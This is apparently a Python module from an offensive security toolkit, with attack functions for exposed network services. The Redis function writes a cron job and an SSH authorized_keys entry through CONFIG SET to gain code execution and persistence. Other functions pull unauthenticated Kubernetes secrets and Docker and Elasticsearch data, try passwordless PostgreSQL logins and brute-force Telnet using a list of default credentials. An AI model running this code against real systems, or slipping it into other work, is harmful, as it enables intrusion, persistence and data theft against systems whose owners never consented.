"""
Advanced Service Attacks — new service exploit/enum modules.

Covers: Redis, MongoDB, PostgreSQL, MSSQL, Docker, Kubernetes,
        Elasticsearch, Memcached, VNC, LDAP, Telnet
"""
import http.client
import json
import socket
import ssl
import struct
import time
import re

from Design.colors_cli import console, escape
from modules.target import TargetInfo
from modules.attack_config import AttackConfig
from modules.downloads import save_text, save_bytes


# ---------- helpers ----------

def _tcp(host, port, timeout=8):
    return socket.create_connection((host, port), timeout=timeout)


def _http_get(host, port, path, tls=False, timeout=8, headers=None):
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            c = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            c = http.client.HTTPConnection(host, port, timeout=timeout)
        hdrs = {"User-Agent": "Mozilla/5.0"}
        if headers:
            hdrs.update(headers)
        c.request("GET", path, headers=hdrs)
        r = c.getresponse()
        body = r.read(1024 * 256)
        c.close()
        return r.status, body.decode("utf-8", "replace")
    except Exception:
        return None, ""


def _recv_all(s, max_bytes=16384, timeout=3.0):
    s.settimeout(timeout)
    data = b""
    try:
        while len(data) < max_bytes:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except Exception:
        pass
    return data


# ═══════════════════════════════════════════════════════════════
# 1. REDIS SCAN
# ═══════════════════════════════════════════════════════════════

def run_redis_scan(target, config):
    console.print(
        f"\n[bold primary][ REDIS SCAN ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Checks for unauthenticated access, dumps INFO and key list.[/dim italic]\n"
    )
    try:
        s = _tcp(target.host, target.port)
        s.settimeout(8)

        # PING — no-auth check
        s.sendall(b"PING\r\n")
        resp = _recv_all(s, 256, 3).decode("utf-8", "replace")

        if "+PONG" in resp:
            console.print("  [bold error]⚠ NO AUTHENTICATION — Redis PING succeeded without credentials[/bold error]")

            # INFO ALL
            s.sendall(b"INFO ALL\r\n")
            info_data = _recv_all(s, 32768, 4)
            info_text = info_data.decode("utf-8", "replace")
            save_text(info_text, "redis_info.txt", host=target.host, subdir="redis")

            for line in info_text.splitlines():
                for key in ("redis_version", "connected_clients", "used_memory_human",
                            "role", "os", "tcp_port", "config_file"):
                    if line.startswith(f"{key}:"):
                        console.print(f"  [muted]{key}:[/muted] [text]{escape(line.split(':',1)[1].strip())}[/text]")

            # CONFIG GET dir (useful for RCE path)
            s.sendall(b"CONFIG GET dir\r\n")
            cfg = _recv_all(s, 512, 2).decode("utf-8", "replace")
            m = re.search(r"\$\d+\r\n(.+)\r\n", cfg)
            if m:
                console.print(f"  [muted]config dir:[/muted] [text]{escape(m.group(1))}[/text]")

            # SCAN 0 COUNT 500
            s.sendall(b"SCAN 0 COUNT 500\r\n")
            scan_data = _recv_all(s, 16384, 4).decode("utf-8", "replace")
            keys = [l for l in scan_data.splitlines() if l and not l.startswith("*") and not l.startswith("$") and not l.isdigit()]
            console.print(f"  [muted]Keys sample:[/muted] [text]{len(keys)} returned[/text]")
            for k in keys[:20]:
                console.print(f"  [text]  → {escape(k)}[/text]")
            save_text(scan_data, "redis_keys.txt", host=target.host, subdir="redis")
        else:
            console.print(f"  [muted]Authentication required or not Redis (got: {escape(resp[:60])})[/muted]")
        s.close()
    except Exception as exc:
        console.print(f"  [muted]Connection failed: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 2. REDIS RCE
# ═══════════════════════════════════════════════════════════════

def run_redis_rce(target, config):
    console.print(
        f"\n[bold primary][ REDIS RCE — CONFIG SET ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Abuses Redis CONFIG SET to write SSH keys or cron jobs.[/dim italic]\n"
    )
    try:
        s = _tcp(target.host, target.port)
        s.settimeout(8)

        s.sendall(b"PING\r\n")
        resp = _recv_all(s, 128, 2).decode("utf-8", "replace")
        if "+PONG" not in resp:
            console.print("  [muted]Auth required — cannot exploit[/muted]")
            s.close()
            return

        def send_cmd(cmd: bytes) -> str:
            s.sendall(cmd)
            time.sleep(0.15)
            return _recv_all(s, 256, 2).decode("utf-8", "replace")

        findings = []

        # Attempt 1: cron RCE
        console.print("  [muted]Attempting cron-based RCE...[/muted]")
        payload = b"\n\n*/1 * * * * root id >> /tmp/redis_rce_proof.txt\n\n"
        r1 = send_cmd(b"CONFIG SET dir /etc/\r\n")
        r2 = send_cmd(b"CONFIG SET dbfilename cron.d\r\n")
        r3 = send_cmd(b"SET rce \"" + payload + b"\"\r\n")
        r4 = send_cmd(b"BGSAVE\r\n")
        for label, r in [("SET dir /etc/", r1), ("SET dbfilename cron.d", r2),
                          ("SET rce payload", r3), ("BGSAVE", r4)]:
            if "OK" in r or "Background" in r:
                console.print(f"  [success]✓ {label}[/success]")
                findings.append(f"cron_rce: {label}")
            else:
                console.print(f"  [muted]  {label}: {escape(r.strip()[:60])}[/muted]")

        # Attempt 2: SSH authorized_keys
        console.print("  [muted]Attempting SSH key persistence...[/muted]")
        pub_key = b"\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+test redis-rce-key\n"
        send_cmd(b"CONFIG SET dir /root/.ssh/\r\n")
        send_cmd(b"CONFIG SET dbfilename authorized_keys\r\n")
        send_cmd(b"SET ssh_key \"" + pub_key + b"\"\r\n")
        r_save = send_cmd(b"BGSAVE\r\n")
        if "Background" in r_save or "OK" in r_save:
            console.print("  [bold warning]⚠ SSH authorized_keys payload sent[/bold warning]")
            findings.append("ssh_key: BGSAVE triggered to /root/.ssh/authorized_keys")

        s.close()
        if findings:
            save_text("\n".join(findings), "redis_rce.txt", host=target.host, subdir="redis")
            console.print(
                "  [bold error]⚠ RCE payloads sent — verify /tmp/redis_rce_proof.txt on target[/bold error]"
            )
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 3. MONGODB ENUM
# ═══════════════════════════════════════════════════════════════

def run_mongo_enum(target, config):
    console.print(
        f"\n[bold primary][ MONGODB ENUM ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Lists databases and collections without credentials.[/dim italic]\n"
    )
    try:
        def _bson_int32(key: str, val: int) -> bytes:
            return b"\x10" + key.encode() + b"\x00" + struct.pack("<i", val)

        def _bson_doc(fields: dict) -> bytes:
            body = b""
            for k, v in fields.items():
                if isinstance(v, int):
                    body += _bson_int32(k, v)
            total = len(body) + 5
            return struct.pack("<i", total) + body + b"\x00"

        bson = _bson_doc({"listDatabases": 1, "nameOnly": 1})
        # OP_QUERY: flags=0, collection="admin.$cmd", skip=0, return=1, query=bson
        coll = b"admin.$cmd\x00"
        msg_len = 4*4 + 4 + len(coll) + 4 + 4 + len(bson)
        header = struct.pack("<iiii", msg_len, 1, 0, 2004)
        full = header + struct.pack("<I", 0) + coll + struct.pack("<ii", 0, 1) + bson

        s = _tcp(target.host, target.port)
        s.settimeout(8)
        s.sendall(full)
        data = _recv_all(s, 32768, 4)
        s.close()

        text = data.decode("utf-8", "replace")
        if data and len(data) > 20:
            console.print("  [bold error]⚠ MongoDB responded — checking auth...[/bold error]")
            # Extract readable strings (db names are printable ASCII)
            names = re.findall(r"[a-zA-Z_][a-zA-Z0-9_.]{2,40}", text)
            # Filter common noise
            noise = {"listDatabases", "nameOnly", "admin", "totalSize", "ok", "errmsg"}
            names = [n for n in dict.fromkeys(names) if n not in noise][:30]
            if names:
                console.print("  [muted]Possible database names:[/muted]")
                for n in names:
                    console.print(f"  [text]  → {escape(n)}[/text]")
            save_text(text, "mongo_response.txt", host=target.host, subdir="mongodb")
            if "errmsg" in text or "Unauthorized" in text:
                console.print("  [muted]Authentication required[/muted]")
            else:
                console.print("  [bold error]⚠ No auth error — MongoDB may be open[/bold error]")
        else:
            console.print("  [muted]No meaningful response[/muted]")
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 4. POSTGRESQL SCAN
# ═══════════════════════════════════════════════════════════════

def run_postgres_scan(target, config):
    console.print(
        f"\n[bold primary][ POSTGRESQL SCAN ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Tries passwordless login for common users.[/dim italic]\n"
    )
    users = ["postgres", "admin", "root", "pgsql", "pgadmin"]
    for user in users:
        try:
            user_param = b"user\x00" + user.encode() + b"\x00"
            db_param   = b"database\x00postgres\x00"
            body = b"\x00\x03\x00\x00" + user_param + db_param + b"\x00"
            msg  = struct.pack(">I", len(body) + 4) + body

            s = _tcp(target.host, target.port, timeout=5)
            s.settimeout(5)
            s.sendall(msg)
            resp = _recv_all(s, 512, 3)
            s.close()

            if not resp:
                console.print(f"  [muted]user={escape(user)}: no response[/muted]")
                continue

            msg_type = chr(resp[0]) if resp else "?"
            if msg_type == "R":
                auth_type = struct.unpack(">I", resp[5:9])[0] if len(resp) >= 9 else -1
                if auth_type == 0:
                    console.print(f"  [bold error]⚠ NO AUTH for user '{escape(user)}' — AuthenticationOK[/bold error]")
                    save_text(f"user={user}\nno_auth=true\nhost={target.host}:{target.port}\n",
                              "pg_noauth.txt", host=target.host, subdir="postgres")
                    return
                elif auth_type == 3:
                    console.print(f"  [muted]user={escape(user)}: CleartextPassword required[/muted]")
                elif auth_type == 5:
                    console.print(f"  [muted]user={escape(user)}: MD5 password required[/muted]")
                else:
                    console.print(f"  [muted]user={escape(user)}: auth_type={auth_type}[/muted]")
            elif msg_type == "E":
                detail = resp[5:].decode("utf-8", "replace")[:80]
                console.print(f"  [muted]user={escape(user)}: error — {escape(detail)}[/muted]")
            else:
                console.print(f"  [muted]user={escape(user)}: unexpected msg_type={escape(msg_type)}[/muted]")
        except Exception as exc:
            console.print(f"  [muted]user={escape(user)}: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 5. MSSQL SCAN
# ═══════════════════════════════════════════════════════════════

def run_mssql_scan(target, config):
    console.print(
        f"\n[bold primary][ MSSQL SCAN ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Sends TDS pre-login packet and parses version response.[/dim italic]\n"
    )
    try:
        # TDS pre-login packet (minimal)
        prelogin = bytes([
            0x12, 0x01, 0x00, 0x2f, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x1a, 0x00, 0x06, 0x01, 0x00, 0x20,
            0x00, 0x01, 0x02, 0x00, 0x21, 0x00, 0x01, 0x03,
            0x00, 0x22, 0x00, 0x04, 0x04, 0x00, 0x26, 0x00,
            0x01, 0xff,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ])
        s = _tcp(target.host, target.port)
        s.settimeout(8)
        s.sendall(prelogin)
        resp = _recv_all(s, 4096, 4)
        s.close()

        if resp:
            console.print(f"  [success]✓ MSSQL responded to TDS pre-login ({len(resp)} bytes)[/success]")
            # Parse version from bytes 11-14 of TDS response body
            if len(resp) >= 15:
                major = resp[11] if len(resp) > 11 else 0
                minor = resp[12] if len(resp) > 12 else 0
                build_hi = resp[13] if len(resp) > 13 else 0
                build_lo = resp[14] if len(resp) > 14 else 0
                if major:
                    version_str = f"{major}.{minor}.{build_hi * 256 + build_lo}"
                    console.print(f"  [muted]TDS Version:[/muted] [text]{escape(version_str)}[/text]")
            text = resp.decode("utf-8", "replace")
            save_text(text, "mssql_prelogin.txt", host=target.host, subdir="mssql")
        else:
            console.print("  [muted]No TDS response — may not be MSSQL or firewall blocking[/muted]")
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 6. DOCKER ESCAPE
# ═══════════════════════════════════════════════════════════════

def run_docker_escape(target, config):
    console.print(
        f"\n[bold primary][ DOCKER API — UNAUTHENTICATED ESCAPE ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Hits unauthenticated Docker daemon API, lists containers and images.[/dim italic]\n"
    )
    endpoints = [
        ("/v1.41/version",         "Docker Version"),
        ("/v1.41/info",            "Host Info"),
        ("/v1.41/containers/json", "Running Containers"),
        ("/v1.41/images/json",     "Images"),
        ("/v1.41/networks",        "Networks"),
        ("/v1.41/volumes",         "Volumes"),
        ("/v1.41/secrets",         "Secrets (Swarm)"),
    ]
    found_any = False
    for path, label in endpoints:
        status, body = _http_get(target.host, target.port, path, tls=False)
        if status == 200:
            found_any = True
            console.print(f"  [bold error]⚠ EXPOSED: {label}[/bold error] ({len(body)}b)")
            fname = f"docker_{label.lower().replace(' ','_').replace('(','').replace(')','')}.json"
            save_text(body, fname, host=target.host, subdir="docker")
            # Pretty-print first item
            try:
                data = json.loads(body)
                if isinstance(data, list) and data:
                    item = data[0]
                    for field in ("Names", "RepoTags", "Id", "Name"):
                        if field in item:
                            console.print(f"  [text]  {field}: {escape(str(item[field])[:80])}[/text]")
                elif isinstance(data, dict):
                    for field in ("Name", "ID", "ServerVersion", "OperatingSystem", "NCPU"):
                        if field in data:
                            console.print(f"  [text]  {field}: {escape(str(data[field])[:80])}[/text]")
            except Exception:
                pass
        elif status == 404:
            console.print(f"  [muted]{label}: 404[/muted]")
        elif status:
            console.print(f"  [muted]{label}: HTTP {status}[/muted]")

    if not found_any:
        console.print("  [muted]Docker API not accessible or requires TLS[/muted]")


# ═══════════════════════════════════════════════════════════════
# 7. KUBERNETES SECRETS
# ═══════════════════════════════════════════════════════════════

def run_kube_secrets(target, config):
    console.print(
        f"\n[bold primary][ KUBERNETES API — ANONYMOUS ACCESS ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Queries Kubernetes API server for secrets without authentication.[/dim italic]\n"
    )
    tls = target.port in (6443, 10250)
    endpoints = [
        ("/version",             "Version"),
        ("/api/v1/namespaces",   "Namespaces"),
        ("/api/v1/pods",         "Pods"),
        ("/api/v1/secrets",      "Secrets"),
        ("/api/v1/configmaps",   "ConfigMaps"),
        ("/api/v1/serviceaccounts", "Service Accounts"),
        ("/apis/apps/v1/deployments", "Deployments"),
    ]
    for path, label in endpoints:
        status, body = _http_get(target.host, target.port, path, tls=tls)
        if status == 200:
            console.print(f"  [bold error]⚠ EXPOSED (200): {label}[/bold error] ({len(body)}b)")
            save_text(body, f"kube_{label.lower().replace(' ','_')}.json",
                      host=target.host, subdir="kubernetes")
            # Try to count items
            try:
                data = json.loads(body)
                items = data.get("items", [])
                if items:
                    console.print(f"  [text]  {len(items)} item(s) found[/text]")
            except Exception:
                pass
        elif status == 403:
            console.print(f"  [muted]{label}: 403 (exists but protected)[/muted]")
        elif status == 401:
            console.print(f"  [muted]{label}: 401 Unauthorized[/muted]")
        elif status:
            console.print(f"  [muted]{label}: HTTP {status}[/muted]")
        else:
            console.print(f"  [muted]{label}: no response[/muted]")


# ═══════════════════════════════════════════════════════════════
# 8. ELASTICSEARCH DUMP
# ═══════════════════════════════════════════════════════════════

def run_elastic_dump(target, config):
    console.print(
        f"\n[bold primary][ ELASTICSEARCH DUMP ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Enumerates indices and dumps sample documents.[/dim italic]\n"
    )
    endpoints = [
        ("/",                                           "Cluster Info"),
        ("/_cat/indices?v&h=index,docs.count,store.size", "Index List"),
        ("/_cluster/health",                             "Cluster Health"),
        ("/_cat/nodes?v",                                "Nodes"),
        ("/_all/_search?size=5",                         "Sample Docs"),
        ("/_security/user",                              "Security Users"),
        ("/_snapshot",                                   "Snapshots"),
    ]
    for path, label in endpoints:
        status, body = _http_get(target.host, target.port, path)
        if status == 200:
            console.print(f"  [bold success]✓ {label}[/bold success] ({len(body)}b)")
            fname = f"elastic_{label.lower().replace(' ','_').replace('/','')}.txt"
            save_text(body, fname, host=target.host, subdir="elasticsearch")
            if label == "Index List":
                for line in body.splitlines()[1:16]:  # skip header
                    if line.strip():
                        console.print(f"  [text]  {escape(line.strip()[:100])}[/text]")
            elif label == "Cluster Info":
                try:
                    d = json.loads(body)
                    ver = d.get("version", {}).get("number", "?")
                    name = d.get("cluster_name", "?")
                    console.print(f"  [text]  Cluster: {escape(name)}  Version: {escape(ver)}[/text]")
                except Exception:
                    pass
        elif status:
            console.print(f"  [muted]{label}: HTTP {status}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 9. MEMCACHED DUMP
# ═══════════════════════════════════════════════════════════════

def run_memcached_dump(target, config):
    console.print(
        f"\n[bold primary][ MEMCACHED DUMP ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Dumps stats and slab contents without authentication.[/dim italic]\n"
    )
    try:
        s = _tcp(target.host, target.port)
        s.settimeout(8)
        output_parts = []

        for cmd, label in [
            (b"stats\r\n",       "Stats"),
            (b"stats items\r\n", "Items"),
            (b"stats slabs\r\n", "Slabs"),
            (b"stats sizes\r\n", "Sizes"),
        ]:
            s.sendall(cmd)
            data = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b"END\r\n" in data or b"ERROR" in data:
                        break
            except Exception:
                pass
            text = data.decode("utf-8", "replace")
            output_parts.append(f"=== {label} ===\n{text}")
            console.print(f"  [success]✓ {label}:[/success] [text]{len(text)}b[/text]")

        full = "\n".join(output_parts)
        save_text(full, "memcached_dump.txt", host=target.host, subdir="memcached")

        m = re.search(r"STAT version (\S+)", full)
        if m:
            console.print(f"  [muted]Version:[/muted] [text]{escape(m.group(1))}[/text]")

        m2 = re.search(r"STAT curr_items (\d+)", full)
        if m2:
            console.print(f"  [muted]Items cached:[/muted] [text]{escape(m2.group(1))}[/text]")

        s.close()
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 10. VNC SCAN
# ═══════════════════════════════════════════════════════════════

def run_vnc_scan(target, config):
    console.print(
        f"\n[bold primary][ VNC SCAN ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Checks VNC banner and whether authentication is required.[/dim italic]\n"
    )
    try:
        s = _tcp(target.host, target.port)
        s.settimeout(8)
        banner_data = _recv_all(s, 256, 3)
        banner = banner_data.decode("utf-8", "replace").strip()
        console.print(f"  [muted]Banner:[/muted] [text]{escape(banner)}[/text]")

        m = re.search(r"RFB (\d+)\.(\d+)", banner)
        if not m:
            console.print("  [muted]Not VNC or unexpected banner[/muted]")
            s.close()
            return

        major, minor = int(m.group(1)), int(m.group(2))
        console.print(f"  [muted]RFB version:[/muted] [text]{major}.{minor}[/text]")

        # Respond with matching version
        s.sendall(f"RFB {major:03d}.{minor:03d}\n".encode())
        sec_data = _recv_all(s, 256, 3)

        if major == 3 and minor <= 3:
            # VNC 3.3: server dictates security type
            if len(sec_data) >= 4:
                auth_type = struct.unpack(">I", sec_data[:4])[0]
                labels = {0: "Invalid/Error", 1: "None (NO AUTH)", 2: "VNC Authentication"}
                console.print(
                    f"  [muted]Security type:[/muted] [text]{auth_type} — {labels.get(auth_type, 'Unknown')}[/text]"
                )
                if auth_type == 1:
                    console.print("  [bold error]⚠ NO AUTHENTICATION REQUIRED (VNC 3.3)[/bold error]")
                    save_text(
                        f"host={target.host}:{target.port}\nversion=RFB {major}.{minor}\nauth=None\n",
                        "vnc_noauth.txt", host=target.host, subdir="vnc",
                    )
        else:
            # VNC 3.7+: server sends list of security types
            if sec_data:
                n = sec_data[0]
                types = list(sec_data[1:1 + n])
                type_names = {1: "None", 2: "VNC Auth", 16: "Tight", 18: "TLS", 19: "VeNCrypt"}
                type_strs = [f"{t}({type_names.get(t,'?')})" for t in types]
                console.print(f"  [muted]Security types:[/muted] [text]{', '.join(type_strs)}[/text]")
                if 1 in types:
                    console.print("  [bold error]⚠ No-auth (type 1) is offered — NO PASSWORD NEEDED[/bold error]")
                    save_text(
                        f"host={target.host}:{target.port}\nversion=RFB {major}.{minor}\nno_auth_offered=true\n",
                        "vnc_noauth.txt", host=target.host, subdir="vnc",
                    )
        s.close()
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 11. LDAP ENUM
# ═══════════════════════════════════════════════════════════════

def run_ldap_enum(target, config):
    console.print(
        f"\n[bold primary][ LDAP ENUM — ANONYMOUS BIND ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Attempts anonymous LDAP bind and base object search.[/dim italic]\n"
    )
    try:
        # Anonymous BindRequest (BER/DER encoding)
        # LDAPMessage ::= SEQUENCE { messageID=1, BindRequest { version=3, name="", auth=simple "" } }
        bind_req = bytes([
            0x30, 0x0c,        # SEQUENCE (12 bytes)
            0x02, 0x01, 0x01,  # INTEGER messageID = 1
            0x60, 0x07,        # [APPLICATION 0] BindRequest (7 bytes)
            0x02, 0x01, 0x03,  # INTEGER version = 3
            0x04, 0x00,        # OCTET STRING name = ""
            0x80, 0x00,        # [0] simple auth = ""
        ])

        s = _tcp(target.host, target.port)
        s.settimeout(8)
        s.sendall(bind_req)
        resp = _recv_all(s, 1024, 3)

        if not resp:
            console.print("  [muted]No LDAP response[/muted]")
            s.close()
            return

        # Check for BindResponse with resultCode=0 (success)
        # Pattern: 30 xx 02 01 01 61 xx 0a 01 00 (resultCode = 0)
        if b"\x0a\x01\x00" in resp:
            console.print("  [bold error]⚠ Anonymous LDAP bind SUCCEEDED[/bold error]")
            save_text(resp.decode("utf-8", "replace"), "ldap_bind.txt",
                      host=target.host, subdir="ldap")

            # Root DSE search (base="", scope=base, filter=present(objectClass))
            search_req = bytes([
                0x30, 0x25,        # SEQUENCE (37 bytes)
                0x02, 0x01, 0x02,  # messageID = 2
                0x63, 0x20,        # [APPLICATION 3] SearchRequest (32 bytes)
                0x04, 0x00,        # baseObject = ""
                0x0a, 0x01, 0x02,  # scope = wholeSubtree
                0x0a, 0x01, 0x00,  # derefAliases = neverDerefAliases
                0x02, 0x01, 0x00,  # sizeLimit = 0
                0x02, 0x01, 0x00,  # timeLimit = 0
                0x01, 0x01, 0x00,  # typesOnly = false
                0x87, 0x0b,        # filter: present
                0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73,  # "objectClass"
                0x30, 0x00,        # attributes = []
            ])
            s.sendall(search_req)
            search_resp = _recv_all(s, 16384, 4)
            if search_resp:
                text = search_resp.decode("utf-8", "replace")
                # Extract printable strings (DN names, etc.)
                entries = re.findall(r"[a-zA-Z][a-zA-Z0-9=,. _@-]{5,80}", text)
                for e in list(dict.fromkeys(entries))[:20]:
                    console.print(f"  [text]  {escape(e)}[/text]")
                save_text(text, "ldap_search.txt", host=target.host, subdir="ldap")
                console.print(f"  [muted]Search response:[/muted] [text]{len(search_resp)}b saved[/text]")
        else:
            console.print("  [muted]Anonymous bind denied (expected)[/muted]")

        s.close()
    except Exception as exc:
        console.print(f"  [muted]Error: {escape(str(exc))}[/muted]")


# ═══════════════════════════════════════════════════════════════
# 12. TELNET BRUTE
# ═══════════════════════════════════════════════════════════════

def run_telnet_brute(target, config):
    console.print(
        f"\n[bold primary][ TELNET BRUTE ][/bold primary]\n"
        f"  [muted]Target :[/muted] [primary]{target.host}:{target.port}[/primary]\n"
        f"  [dim italic]⟶ Tries common credentials over raw Telnet socket.[/dim italic]\n"
    )
    creds = [
        ("root",   ""),
        ("root",   "root"),
        ("root",   "toor"),
        ("root",   "admin"),
        ("root",   "password"),
        ("root",   "1234"),
        ("root",   "123456"),
        ("admin",  "admin"),
        ("admin",  ""),
        ("admin",  "password"),
        ("admin",  "1234"),
        ("guest",  "guest"),
        ("guest",  ""),
        ("user",   "user"),
        ("cisco",  "cisco"),
        ("cisco",  ""),
        ("ubnt",   "ubnt"),
        ("pi",     "raspberry"),
        ("default","default"),
    ]
    for user, pw in creds:
        try:
            s = _tcp(target.host, target.port, timeout=5)
            s.settimeout(5)
            # Drain banner / IAC negotiation
            try:
                s.recv(2048)
            except Exception:
                pass
            # Send username
            s.sendall((user + "\r\n").encode())
            time.sleep(0.4)
            try:
                s.recv(512)
            except Exception:
                pass
            # Send password
            s.sendall((pw + "\r\n").encode())
            time.sleep(0.6)
            resp = b""
            try:
                resp = s.recv(1024)
            except Exception:
                pass
            s.close()

            text = resp.decode("utf-8", "replace").lower()
            pw_display = pw if pw else "(blank)"

            if any(k in text for k in ("$ ", "# ", "> ", "last login", "welcome",
                                        "busybox", "linux", "router")):
                if not any(k in text for k in ("incorrect", "failed", "denied",
                                                "login incorrect", "login:")):
                    console.print(
                        f"  [bold error]⚠ LOGIN SUCCESS: {escape(user)} / {escape(pw_display)}[/bold error]"
                    )
                    save_text(
                        f"user={user}\npass={pw}\nresponse={text[:500]}\n",
                        "telnet_creds.txt", host=target.host, subdir="telnet",
                    )
                    return
            console.print(f"  [muted]✗ {escape(user)}:{escape(pw_display)}[/muted]")
        except Exception as exc:
            console.print(f"  [muted]  connect error: {escape(str(exc))}[/muted]")
            continue
